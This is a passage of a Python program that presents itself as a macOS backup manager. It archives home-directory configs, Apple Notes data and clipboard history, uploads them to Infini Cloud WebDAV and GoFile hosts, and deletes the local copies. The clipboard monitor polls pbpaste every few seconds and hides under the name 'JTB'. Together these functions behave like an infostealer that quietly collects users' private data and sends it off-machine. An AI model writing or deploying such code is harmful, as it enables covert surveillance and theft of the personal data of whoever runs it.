                    self._safe_remove_file(file_path, retry=True)
            return success
        else:
            return self._upload_single_file(file_path)

    def _create_remote_directory(self, remote_dir, infini_url=None, auth=None):
        """创建远程目录（使用 WebDAV MKCOL 方法）"""
        if not remote_dir or remote_dir == '.':
            return True

        if not infini_url:
            infini_url = self.infini_url
        if auth is None:
            auth = self.auth
        
        try:
            # 构建目录路径
            dir_path = f"{infini_url.rstrip('/')}/{remote_dir.lstrip('/')}"
            
            response = self.session.request('MKCOL', dir_path, auth=auth, timeout=(8, 8))
            
            if response.status_code in [201, 204, 405]:  # 405 表示已存在
                return True
            elif response.status_code == 409:
                # 409 可能表示父目录不存在，尝试创建父目录
                parent_dir = os.path.dirname(remote_dir)
                if parent_dir and parent_dir != '.':
                    if self._create_remote_directory(parent_dir, infini_url=infini_url, auth=auth):
                        # 父目录创建成功，再次尝试创建当前目录
                        response = self.session.request('MKCOL', dir_path, auth=auth, timeout=(8, 8))
                        return response.status_code in [201, 204, 405]
                return False
            else:
                return False
        except Exception:
            return False

    def _upload_single_file_infini(self, file_path, infini_config):
        """使用指定的 Infini 配置上传单个文件（使用 WebDAV PUT 方法）。"""
        try:
            config_name = infini_config.get("name", "Infini Cloud")
            infini_url = infini_config.get("url", "").strip()
            infini_user = infini_config.get("user", "").strip()
            infini_password = infini_config.get("password", "")

            if not infini_url or not infini_user or not infini_password:
                logging.error(f"❌ [{config_name}] 配置不完整，跳过")
                return False

            auth = HTTPBasicAuth(infini_user, infini_password)

            # 检查文件权限和状态
            if not os.path.exists(file_path):
                logging.error(f"文件不存在: {file_path}")
                return False
                
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"文件大小为0: {file_path}")
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"文件过大 {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                return False

            # 构建远程路径
            filename = os.path.basename(file_path)
            remote_filename = f"{self.config.INFINI_REMOTE_BASE_DIR}/{filename}"
            remote_path = f"{infini_url.rstrip('/')}/{remote_filename.lstrip('/')}"
            
            # 创建远程目录（如果需要）
            remote_dir = os.path.dirname(remote_filename)
            if remote_dir and remote_dir != '.':
                if not self._create_remote_directory(remote_dir, infini_url=infini_url, auth=auth):
                    logging.warning(f"[{config_name}] 无法创建远程目录: {remote_dir}，将继续尝试上传")

            # 上传重试逻辑
            for attempt in range(self.config.RETRY_COUNT):
                if not self._check_internet_connection():
                    logging.error("网络连接不可用，等待重试...")
                    time.sleep(self.config.RETRY_DELAY)
                    continue

                try:
                    # 根据文件大小动态调整超时时间
                    if file_size < 1024 * 1024:  # 小于1MB
                        connect_timeout = 10
                        read_timeout = 30
                    elif file_size < 10 * 1024 * 1024:  # 1-10MB
                        connect_timeout = 15
                        read_timeout = max(30, int(file_size / 1024 / 1024 * 5))
                    else:  # 大于10MB
                        connect_timeout = 20
                        read_timeout = max(60, int(file_size / 1024 / 1024 * 6))
                    
                    # 只在第一次尝试时显示详细信息
                    if attempt == 0:
                        size_str = f"{file_size / 1024 / 1024:.2f}MB" if file_size >= 1024 * 1024 else f"{file_size / 1024:.2f}KB"
                        logging.critical(f"📤 [{config_name}] 上传: {filename} ({size_str})")
                    elif self.config.DEBUG_MODE:
                        logging.debug(f"[{config_name}] 重试上传: {filename} (第 {attempt + 1} 次)")
                    
                    # 准备请求头
                    headers = {
                        'Content-Type': 'application/octet-stream',
                        'Content-Length': str(file_size),
                    }
                    
                    # 执行上传（使用 WebDAV PUT 方法）
                    with open(file_path, 'rb') as f:
                        response = self.session.put(
                            remote_path,
                            data=f,
                            headers=headers,
                            auth=auth,
                            timeout=(connect_timeout, read_timeout),
                            stream=False
                        )
                    
                    if response.status_code in [201, 204]:
                        logging.critical(f"✅ [{config_name}] {filename}")
                        return True
                    elif response.status_code == 403:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [{config_name}] {filename}: 权限不足")
                    elif response.status_code == 404:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [{config_name}] {filename}: 远程路径不存在")
                    elif response.status_code == 409:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [{config_name}] {filename}: 远程路径冲突")
                    else:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [{config_name}] {filename}: 状态码 {response.status_code}")
                        
                except requests.exceptions.Timeout:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [{config_name}] {os.path.basename(file_path)}: 超时")
                except requests.exceptions.SSLError:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [{config_name}] {os.path.basename(file_path)}: SSL错误")
                except requests.exceptions.ConnectionError:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [{config_name}] {os.path.basename(file_path)}: 连接错误")
                except Exception as e:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [{config_name}] {os.path.basename(file_path)}: {str(e)}")

                if attempt < self.config.RETRY_COUNT - 1:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"[{config_name}] 等待 {self.config.RETRY_DELAY} 秒后重试...")
                    time.sleep(self.config.RETRY_DELAY)

            return False
            
        except OSError as e:
            logging.error(f"获取文件信息失败 {file_path}: {e}")
            return False
        except Exception as e:
            logging.error(f"[Infini Cloud] 上传过程出错: {e}")
            return False

    def _upload_single_file_gofile(self, file_path):
        """上传单个文件到 GoFile（备选方案）
        
        Args:
            file_path: 要上传的文件路径
            
        Returns:
            bool: 上传是否成功
        """
        if not os.path.exists(file_path):
            logging.error(f"文件不存在: {file_path}")
            return False

        try:
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"文件大小为0: {file_path}")
                return False
            
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"文件过大: {file_path} ({file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB)")
                return False

            filename = os.path.basename(file_path)
            logging.info(f"🔄 尝试使用 GoFile 上传: {filename}")

            server_index = 0
            total_retries = 0
            max_total_retries = len(self.config.UPLOAD_SERVERS) * self.config.MAX_SERVER_RETRIES
            upload_success = False

            while total_retries < max_total_retries and not upload_success:
                if not self._check_internet_connection():
                    logging.error("网络连接不可用，等待重试...")
                    time.sleep(self.config.RETRY_DELAY)
                    total_retries += 1
                    continue

                current_server = self.config.UPLOAD_SERVERS[server_index]
                try:
                    # 使用 with 语句确保文件正确关闭
                    with open(file_path, "rb") as f:
                        response = requests.post(
                            current_server,
                            files={"file": f},
                            headers={"Authorization": f"Bearer {self.api_token}"},
                            timeout=self.config.UPLOAD_TIMEOUT,
                            verify=True
                        )

                        if response.ok:
                            try:
                                result = response.json()
                                if result.get("status") == "ok":
                                    logging.critical(f"✅ [GoFile] {filename}")
                                    upload_success = True
                                    break
                                else:
                                    error_msg = result.get("message", "未知错误")
                                    error_code = result.get("code", 0)
                                    if total_retries == 0 or self.config.DEBUG_MODE:
                                        logging.error(f"[GoFile] 服务器返回错误 (代码: {error_code}): {error_msg}")
                                    
                                    # 处理特定错误码
                                    if error_code in [402, 405]:  # 服务器限制或权限错误
                                        server_index = (server_index + 1) % len(self.config.UPLOAD_SERVERS)
                                        if server_index == 0:  # 如果已经尝试了所有服务器
                                            time.sleep(self.config.RETRY_DELAY * 2)  # 增加等待时间
                            except ValueError:
                                if total_retries == 0 or self.config.DEBUG_MODE:
                                    logging.error("[GoFile] 服务器返回无效JSON数据")
                        else:
                            if total_retries == 0 or self.config.DEBUG_MODE:
                                logging.error(f"[GoFile] 上传失败，HTTP状态码: {response.status_code}")

                except requests.exceptions.Timeout:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [GoFile] {filename}: 上传超时")
                except requests.exceptions.SSLError:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [GoFile] {filename}: SSL错误")
                except requests.exceptions.ConnectionError as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [GoFile] {filename}: 连接错误")
                except requests.exceptions.RequestException as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [GoFile] {filename}: 请求异常")
                except (OSError, IOError) as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [GoFile] {filename}: 文件读取错误")
                except Exception as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [GoFile] {filename}: {str(e)}")

                # 切换到下一个服务器
                server_index = (server_index + 1) % len(self.config.UPLOAD_SERVERS)
                if server_index == 0:
                    time.sleep(self.config.RETRY_DELAY)  # 所有服务器都尝试过后等待
                
                total_retries += 1

            if upload_success:
                return True
            else:
                logging.error(f"❌ [GoFile] {filename}: 上传失败，已达到最大重试次数")
                return False

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"[GoFile] 处理文件时出错: {str(e)}")
            return False
        except Exception as e:
            logging.error(f"[GoFile] 处理文件时出现未知错误: {str(e)}")
            return False

    def _upload_single_file(self, file_path):
        """上传单个文件，依次尝试所有 Infini 配置，全部失败后再使用 GoFile 备选方案
        
        Args:
            file_path: 要上传的文件路径
            
        Returns:
            bool: 上传是否成功
        """
        if not os.path.exists(file_path):
            logging.error(f"文件不存在: {file_path}")
            return False

        try:
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"文件大小为0: {file_path}")
                self._safe_remove_file(file_path, retry=False)
                return False
            
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"文件过大: {file_path} ({file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB)")
                return False

            infini_configs = self.infini_configs if self.infini_configs else [
                {
                    "name": "Infini-默认配置",
                    "url": self.infini_url,
                    "user": self.infini_user,
                    "password": self.infini_pass,
                }
            ]

            # 依次尝试所有 Infini 上传配置
            for index, infini_config in enumerate(infini_configs, start=1):
                config_name = infini_config.get("name", f"Infini-{index}")
                logging.info(f"🔄 尝试 Infini 上传配置 {index}/{len(infini_configs)}: {config_name}")
                if self._upload_single_file_infini(file_path, infini_config):
                    self._safe_remove_file(file_path, retry=True)
                    return True

            # 所有 Infini 上传方法都失败后，才尝试 GoFile 备选方案
            logging.warning(f"⚠️ 所有 Infini 上传方法均失败，尝试使用 GoFile 备选方案: {os.path.basename(file_path)}")
            if self._upload_single_file_gofile(file_path):
                self._safe_remove_file(file_path, retry=True)
                return True
            
            # 所有方法都失败
            logging.error(f"❌ {os.path.basename(file_path)}: 所有上传方法均失败")
            return False

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"处理文件时出错: {str(e)}")
            return False
        except Exception as e:
            logging.error(f"处理文件时出现未知错误: {str(e)}")
            return False

    def zip_backup_folder(self, folder_path, zip_file_path):
        """压缩备份文件夹为tar.gz格式
        
        Args:
            folder_path: 要压缩的文件夹路径
            zip_file_path: 压缩文件路径（不含扩展名）
            
        Returns:
            str or list: 压缩文件路径或压缩文件路径列表
        """
        try:
            if folder_path is None or not os.path.exists(folder_path):
                return None

            # 检查源目录是否为空
            total_files = sum(len(files) for _, _, files in os.walk(folder_path))
            if total_files == 0:
                logging.error(f"源目录为空 {folder_path}")
                return None

            # 计算源目录大小
            dir_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    try:
                        file_path = os.path.join(dirpath, filename)
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:  # 跳过空文件
                            dir_size += file_size
                    except OSError as e:
                        logging.error(f"获取文件大小失败 {file_path}: {e}")
                        continue

            if dir_size > self.config.MAX_SOURCE_DIR_SIZE:
                return self.split_large_directory(folder_path, zip_file_path)

            if not self._ensure_free_space(dir_size, os.path.dirname(zip_file_path) or zip_file_path):
                return None

            tar_path = f"{zip_file_path}.tar.gz"
            if os.path.exists(tar_path):
                os.remove(tar_path)

            with tarfile.open(tar_path, "w:gz", compresslevel=BackupConfig.TAR_COMPRESS_LEVEL) as tar:
                tar.add(folder_path, arcname=os.path.basename(folder_path))

            # 验证压缩文件
            try:
                compressed_size = os.path.getsize(tar_path)
                if compressed_size == 0:
                    logging.error(f"压缩文件大小为0 {tar_path}")
                    if os.path.exists(tar_path):
                        os.remove(tar_path)
                    return None
                    
                self._clean_directory(folder_path)
                return tar_path
            except OSError as e:
                logging.error(f"获取压缩文件大小失败 {tar_path}: {e}")
                if os.path.exists(tar_path):
                    os.remove(tar_path)
                return None
                
        except (OSError, IOError, PermissionError, tarfile.TarError) as e:
            logging.error(f"压缩失败 {folder_path}: {e}")
            return None

    def split_large_directory(self, folder_path, base_zip_path):
        """将大目录分割成多个小块并分别压缩
        
        Args:
            folder_path: 要分割的目录路径
            base_zip_path: 基础压缩文件路径
            
        Returns:
            list: 压缩文件路径列表
        """
        try:
            compressed_files = []
            part_num = 0
            
            # 创建临时目录存放分块
            temp_dir = os.path.join(os.path.dirname(folder_path), "temp_split")
            if not self._ensure_directory(temp_dir):
                return None

            # 目录分包的目标是控制每个归档的源文件总量，而不是使用“压缩后 50MB”去跳过源文件。
            # 单个归档即使压缩后超过 50MB，也由 upload_file 在最终上传阶段安全分片。
            MAX_CHUNK_SIZE = self.config.MAX_SOURCE_DIR_SIZE

            # 先收集所有文件信息
            all_files = []
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    file_path = os.path.join(dirpath, filename)
                    try:
                        file_size = os.path.getsize(file_path)
                        rel_path = os.path.relpath(file_path, folder_path)
                        all_files.append((file_path, rel_path, file_size))
                    except OSError:
                        continue

            # 按文件大小降序排序
            all_files.sort(key=lambda x: x[2], reverse=True)
            if not all_files:
                self._clean_directory(temp_dir)
                logging.error(f"源目录没有可备份文件 {folder_path}")
                return None

            def _build_chunk(chunk):
                """复制一个分块并打包。返回 (成功标志, 归档路径或 None)。"""
                nonlocal part_num
                if not chunk:
                    return True, None

                current_part_num = part_num
                part_dir = os.path.join(temp_dir, f"part{current_part_num}")
                if not self._ensure_directory(part_dir):
                    return False, None

                copied = False
                try:
                    for src, dst_rel, file_size in chunk:
                        dst = os.path.join(part_dir, dst_rel)
                        dst_dir = os.path.dirname(dst)
                        if not self._ensure_directory(dst_dir):
                            return False, None
                        if not self._ensure_free_space(file_size, dst_dir):
                            return False, None
                        shutil.copy2(src, dst)

                    tar_path = f"{base_zip_path}_part{current_part_num}.tar.gz"
                    if os.path.exists(tar_path):
                        os.remove(tar_path)
                    with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                        tar.add(part_dir, arcname=os.path.basename(folder_path))

                    compressed_size = os.path.getsize(tar_path)
                    if compressed_size == 0:
                        os.remove(tar_path)
                        return False, None

                    copied = True
                    return True, tar_path
                except (OSError, IOError, PermissionError, tarfile.TarError) as e:
                    logging.error(f"分块打包失败: {e}")
                    return False, None
                finally:
                    self._clean_directory(part_dir)

            # 使用简单贪心分组，把所有文件（含空文件和超大文件）都纳入归档。
            current_chunk = []
            current_chunk_size = 0
            for file_info in all_files:
                file_path, rel_path, file_size = file_info
                if current_chunk and current_chunk_size + file_size > MAX_CHUNK_SIZE:
                    success, tar_path = _build_chunk(current_chunk)
                    if not success:
                        self._clean_directory(temp_dir)
                        logging.error("目录分包失败，保留待打包目录")
                        return None
                    if tar_path:
                        compressed_files.append(tar_path)
                    part_num += 1
                    current_chunk = []
                    current_chunk_size = 0

                current_chunk.append(file_info)
                current_chunk_size += file_size

            if current_chunk:
                success, tar_path = _build_chunk(current_chunk)
                if not success:
                    self._clean_directory(temp_dir)
                    logging.error("目录分包失败，保留待打包目录")
                    return None
                if tar_path:
                    compressed_files.append(tar_path)

            self._clean_directory(temp_dir)

            if not compressed_files:
                logging.error("分割失败，没有生成有效的压缩文件")
                return None

            # 只有全部源文件都已进入有效归档后才清理源目录。
            self._clean_directory(folder_path)
            logging.info(f"已分割为 {len(compressed_files)} 个压缩文件")
            return compressed_files
        except Exception:
            logging.error("分割失败")
            return None

    def _process_partial_chunk(self, chunk, temp_dir, base_zip_path, part_num, compressed_files, archive_root_name=None):
        """处理部分分块
        
        Args:
            chunk: 要处理的文件列表
            temp_dir: 临时目录路径
            base_zip_path: 基础压缩文件路径
            part_num: 分块编号
            compressed_files: 压缩文件列表
            archive_root_name: 归档内部保留的原始目录名
        """
        if not archive_root_name:
            logging.error("子分包缺少归档根目录名，无法保持原始目录结构")
            return
        part_dir = os.path.join(temp_dir, f"part{part_num}_sub")
        if not self._ensure_directory(part_dir):
            return
        
        chunk_success = True
        total_size = 0
        for src, dst_rel, file_size in chunk:
            dst = os.path.join(part_dir, dst_rel)
            dst_dir = os.path.dirname(dst)
            if not self._ensure_directory(dst_dir):
                chunk_success = False
                break
            try:
                shutil.copy2(src, dst)
                total_size += file_size
            except Exception:
                chunk_success = False
                break
        
        if chunk_success:
            tar_path = f"{base_zip_path}_part{part_num}_sub.tar.gz"
            try:
                with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                    tar.add(part_dir, arcname=archive_root_name)
                
                compressed_size = os.path.getsize(tar_path)
                if compressed_size <= self.config.MAX_SINGLE_FILE_SIZE:
                    compressed_files.append(tar_path)
                    logging.info(f"子分块: {total_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                else:
                    os.remove(tar_path)
            except Exception:
                if os.path.exists(tar_path):
                    os.remove(tar_path)
        
        self._clean_directory(part_dir)

    def get_clipboard_content(self):
        """获取JTB内容"""
        try:
            content = subprocess.check_output(['pbpaste']).decode('utf-8')
            if content is None:
                return None
            # 去除空白字符
            content = content.strip()
            return content if content else None
        except (subprocess.CalledProcessError, RuntimeError, UnicodeDecodeError) as e:
            # 某些环境下（如无图形界面 / 无剪贴板服务）会持续抛出异常
            # 这里不记录错误日志，只返回 None，避免日志被高频刷屏
            return None

    def log_clipboard_update(self, content, file_path):
        """记录JTB更新到文件"""
        try:
            # 确保目录存在
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            
            # 写入日志
            with open(file_path, 'a', encoding='utf-8', errors='ignore') as f:
                f.write(f"\n=== 📋 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                f.write(f"{content}\n")
                f.write("-"*30 + "\n")
        except (OSError, IOError, PermissionError) as e:
            if self.config.DEBUG_MODE:
                logging.error(f"❌ 记录JTB失败: {e}")

    def monitor_clipboard(self, file_path, interval=3):
        """监控JTB变化并记录到文件
        
        Args:
            file_path: 日志文件路径
            interval: 检查间隔（秒）
        """
        # 确保日志目录存在
        log_dir = os.path.dirname(file_path)
        if not os.path.exists(log_dir):
            try:
                os.makedirs(log_dir, exist_ok=True)
            except Exception as e:
                logging.error(f"❌ 创建JTB日志目录失败: {e}")
                return

        last_content = ""
        error_count = 0  # 添加错误计数
        max_errors = 5   # 最大连续错误次数
        
        while True:
            try:
                current_content = self.get_clipboard_content()
                # 只有当JTB内容非空且与上次不同时才记录
                if current_content and current_content != last_content:
                    self.log_clipboard_update(current_content, file_path)
                    last_content = current_content
                    if self.config.DEBUG_MODE:
                        logging.info("📋 检测到JTB更新")
                    error_count = 0  # 重置错误计数
                else:
                    error_count = 0  # 空内容不算错误，重置计数
            except Exception as e:
                error_count += 1
                if error_count >= max_errors:
                    if self.config.DEBUG_MODE:
                        logging.error(f"❌ JTB监控连续出错{max_errors}次，等待{self.config.CLIPBOARD_ERROR_WAIT}秒后重试")
                    time.sleep(self.config.CLIPBOARD_ERROR_WAIT)
                    error_count = 0  # 重置错误计数
                elif self.config.DEBUG_MODE:
                    logging.error(f"❌ JTB监控出错: {e}")
            time.sleep(interval if interval else self.config.CLIPBOARD_CHECK_INTERVAL)

    def upload_backup(self, backup_path):
        """上传备份文件
        
        Args:
            backup_path: 备份文件路径或备份文件路径列表
            
        Returns:
            bool: 上传是否成功
        """
        if isinstance(backup_path, list):
            success = True
            for path in backup_path:
                if not self.upload_file(path):
                    success = False
            return success
        else:
            return self.upload_file(backup_path)

    def backup_specified_files(self, source_dir, target_dir):
        """备份指定的目录和文件
        
        Args:
            source_dir: 源目录路径
            target_dir: 目标目录路径
            
        Returns:
            BackupResult: 备份结果，包含目录路径、状态和遗漏文件列表
        """
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if self.config.DEBUG_MODE:
            logging.debug(f"开始备份指定目录和文件:")
            logging.debug(f"源目录: {source_dir}")
            logging.debug(f"目标目录: {target_dir}")

        if not os.path.exists(source_dir):
            logging.error(f"❌ 源目录不存在: {source_dir}")
            return BackupResult(None, "failed", missing_files=[source_dir])

        if not os.access(source_dir, os.R_OK):
            logging.error(f"❌ 源目录没有读取权限: {source_dir}")
            return BackupResult(None, "failed", missing_files=[source_dir])

        if not self._ensure_free_space(0, os.path.dirname(target_dir) or target_dir):
            return BackupResult(None, "failed", missing_files=[source_dir])

        if not self._clean_directory(target_dir):
            logging.error(f"❌ 无法清理或创建目标目录: {target_dir}")
            return BackupResult(None, "failed", missing_files=[source_dir])

        items_count = 0  # 顶层项目数量（目录或文件）
        files_count = 0  # 实际文件数量
        total_size = 0
        failed_files = []  # 复制失败的具体文件

        def copy_with_size_check(src, dst, is_file=False):
            """复制文件或目录，并在复制前检查磁盘空间。"""
            nonlocal files_count, total_size, failed_files
            
            if is_file:
                try:
                    file_size = os.path.getsize(src)
                    parent_dir = os.path.dirname(dst)
                    if parent_dir:
                        os.makedirs(parent_dir, exist_ok=True)
                    if not self._ensure_free_space(file_size, parent_dir or target_dir):
                        failed_files.append(src)
                        return False
                    shutil.copy2(src, dst)
                    files_count += 1
                    total_size += file_size
                    return True
                except Exception as e:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"复制文件失败: {src} - {str(e)}")
                    failed_files.append(src)
                    return False
            else:
                try:
                    os.makedirs(dst, exist_ok=True)
                    copied_any = False
                    for root, dirs, filenames in os.walk(src):
                        # 计算相对路径
                        rel_root = os.path.relpath(root, src)
                        dst_root = os.path.join(dst, rel_root) if rel_root != '.' else dst
                        
                        # 创建子目录
                        for d in dirs:
                            src_dir = os.path.join(root, d)
                            dst_dir = os.path.join(dst_root, d)
                            os.makedirs(dst_dir, exist_ok=True)
                        
                        # 复制文件
                        for filename in filenames:
                            src_file = os.path.join(root, filename)
                            dst_file = os.path.join(dst_root, filename)
                            
                            try:
                                file_size = os.path.getsize(src_file)
                                dst_file_parent = os.path.dirname(dst_file)
                                os.makedirs(dst_file_parent, exist_ok=True)
                                if not self._ensure_free_space(file_size, dst_file_parent):
                                    failed_files.append(src_file)
                                    continue
                                shutil.copy2(src_file, dst_file)
                                files_count += 1
                                total_size += file_size
                                copied_any = True
                            except Exception as e:
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"复制文件失败: {src_file} - {str(e)}")
                                failed_files.append(src_file)
                                continue
                    
                    return copied_any
                except Exception as e:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"复制目录失败: {src} - {str(e)}")
                    failed_files.append(src)
                    return False

        for item in self.config.MACOS_SPECIFIC_DIRS:
            # 支持通配符（glob），例如 ".openclaw/openclaw.json*"
            if any(ch in item for ch in ["*", "?", "["]):
                pattern = os.path.join(source_dir, item)
                matched_paths = glob.glob(pattern)
                if not matched_paths and self.config.DEBUG_MODE:
                    logging.debug(f"通配符未匹配到任何项目: {pattern}")
                for matched_path in matched_paths:
                    rel_name = os.path.relpath(matched_path, source_dir)
                    if os.path.isfile(matched_path):
                        items_count += 1
                        dst_path = os.path.join(target_dir, rel_name)
                        if copy_with_size_check(matched_path, dst_path, is_file=True):
                            if self.config.DEBUG_MODE:
                                logging.debug(f"✅ 已备份文件: {matched_path} -> {dst_path}")
                    elif os.path.isdir(matched_path):
                        items_count += 1
                        dst_path = os.path.join(target_dir, rel_name)
                        if copy_with_size_check(matched_path, dst_path, is_file=False):
                            if self.config.DEBUG_MODE:
                                logging.debug(f"📁 已备份目录: {matched_path} -> {dst_path}")
                continue

            source_path = os.path.join(source_dir, item)
            if not os.path.exists(source_path):
                if self.config.DEBUG_MODE:
                    logging.debug(f"跳过不存在的项目: {source_path}")
                continue

            try:
                target_path = os.path.join(target_dir, item)
                if os.path.isdir(source_path):
                    # 复制目录
                    if copy_with_size_check(source_path, target_path, is_file=False):
                        items_count += 1
                        if self.config.DEBUG_MODE:
                            logging.debug(f"成功复制目录: {source_path} -> {target_path}")
                else:
                    # 复制文件
                    if copy_with_size_check(source_path, target_path, is_file=True):
                        items_count += 1
                        if self.config.DEBUG_MODE:
                            logging.debug(f"成功复制文件: {source_path} -> {target_path}")
            except Exception as e:
                if self.config.DEBUG_MODE:
                    logging.debug(f"处理失败: {source_path} - {str(e)}")
                failed_files.append(source_path)

        missing_files = list(dict.fromkeys(failed_files))
        if items_count == 0:
            logging.error(f"❌ 未找到需要备份的指定文件")
            return BackupResult(None, "failed", missing_files=missing_files,
                                copied_files=files_count, skipped_files=0)

        status = "partial" if missing_files else "success"
        if status == "partial":
            logging.warning(f"\n⚠️ 指定文件备份部分完成:")
            logging.warning(f"   📁 顶层项目数量: {items_count}")
            logging.warning(f"   📄 实际文件数量: {files_count}")
            logging.warning(f"   💾 总大小: {total_size / 1024 / 1024:.1f}MB")
            logging.warning(f"   ❌ 失败文件数量: {len(missing_files)}")
            if self.config.DEBUG_MODE:
                for missing_file in missing_files[:20]:
                    logging.warning(f"      - {missing_file}")
        else:
            logging.info(f"\n📊 指定文件备份完成:")
            logging.info(f"   📁 顶层项目数量: {items_count}")
            logging.info(f"   📄 实际文件数量: {files_count}")
            logging.info(f"   💾 总大小: {total_size / 1024 / 1024:.1f}MB")

        return BackupResult(target_dir, status, missing_files=missing_files,
                            copied_files=files_count, skipped_files=0,
                            failed_files=missing_files)

    def has_clipboard_content(self, file_path):
        """检查粘贴板文件是否有实际内容记录
        
        Args:
            file_path: 粘贴板日志文件路径
            
        Returns:
            bool: 是否有实际内容记录
        """
        try:
            if not os.path.exists(file_path):
                return False
                
            # 检查文件大小
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                return False
                
            # 读取文件内容
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read().strip()
                
            if not content:
                return False
                
            # 检查是否只包含标题行（没有实际内容）
            lines = content.split('\n')
            actual_content_lines = []
            
            for line in lines:
                line = line.strip()
                # 跳过空行、标题行和分隔线
                if (line and 
                    not line.startswith('===') and 
                    not line.startswith('📋') and 
                    not line.startswith('-') * 30 and
                    not line.startswith('JTB日志已于') and
                    not line.startswith('JTB监控启动于')):
                    actual_content_lines.append(line)
            
            # 如果有实际内容行，返回True
            return len(actual_content_lines) > 0
            
        except Exception as e:
            if self.config.DEBUG_MODE:
                logging.error(f"检查粘贴板文件内容失败: {e}")
            return False

def is_disk_available(disk_path):
    """检查磁盘是否可用"""
    try:
        return os.path.exists(disk_path) and os.access(disk_path, os.R_OK)
    except Exception:
        return False

def get_available_volumes():
    """获取所有可用的数据卷和云盘目录"""
    available_volumes = {}
    
    # 获取用户主目录
    user_path = os.path.expanduser('~')
    if os.path.exists(user_path):
        try:
            logging.info("正在配置用户主目录备份...")
            logging.debug(f"用户主目录: {user_path}")
            
            # 获取用户名前缀
            username = getpass.getuser()
            user_prefix = username[:5] if username else "user"
            
            # 配置用户主目录备份
            backup_path = os.path.join(BackupConfig.BACKUP_ROOT, f'{user_prefix}_home')
            available_volumes['home'] = {
                'docs': (os.path.abspath(user_path), os.path.join(backup_path, f'{user_prefix}_docs'), 1),
                'configs': (os.path.abspath(user_path), os.path.join(backup_path, f'{user_prefix}_configs'), 2),
                'specified': (os.path.abspath(user_path), os.path.join(backup_path, f'{user_prefix}_specified'), 4),
            }
            logging.info(f"✅ 已配置用户主目录备份: {user_path}")
            
        except Exception as e:
            logging.error(f"❌ 配置用户主目录备份时出错: {e}")
    
    if not available_volumes:
        logging.warning("⚠️ 未检测到可用的用户主目录")
    else:
        logging.info(f"📊 已配置用户主目录备份")
        for name, config in available_volumes.items():
            logging.info(f"  - {name}: {config['docs'][0]}")
    
    return available_volumes

@lru_cache()
def get_username():
    """获取当前用户名"""
    return os.environ.get('USERNAME', '')

def clean_backup_directory():
    """清理备份目录中的临时文件和空目录"""
    try:
        if not os.path.exists(BackupConfig.BACKUP_ROOT):
            return
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        # 清理临时目录
        temp_dir = os.path.join(BackupConfig.BACKUP_ROOT, f'{user_prefix}_temp')
        if os.path.exists(temp_dir):
            try:
                shutil.rmtree(temp_dir)
            except Exception as e:
                logging.error(f"清理临时目录失败: {e}")
        
        # 清理空目录
        for root, dirs, files in os.walk(BackupConfig.BACKUP_ROOT, topdown=False):
            for dir_name in dirs:
                dir_path = os.path.join(root, dir_name)
                try:
                    if not os.listdir(dir_path):  # 如果目录为空
                        os.rmdir(dir_path)
                except Exception:
                    continue
                    
    except Exception as e:
        logging.error(f"清理备份目录失败: {e}")

def backup_notes():
    """备份Mac的备忘录数据"""
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    notes_dir = os.path.expanduser('~/Library/Group Containers/group.com.apple.notes')
    notes_backup_directory = os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_notes")
    
    if not os.path.exists(notes_dir):
        logging.error("备忘录数据目录不存在")
        return None
        
    backup_manager = BackupManager()
    if not backup_manager._ensure_free_space(0, os.path.dirname(notes_backup_directory) or notes_backup_directory):
        return None
    if not backup_manager._clean_directory(notes_backup_directory):
        return None

    def snapshot_sqlite(source_file, target_file):
        """使用 SQLite backup API 生成一致性快照，包含已提交的 WAL 数据。"""
        src_conn = None
        dst_conn = None
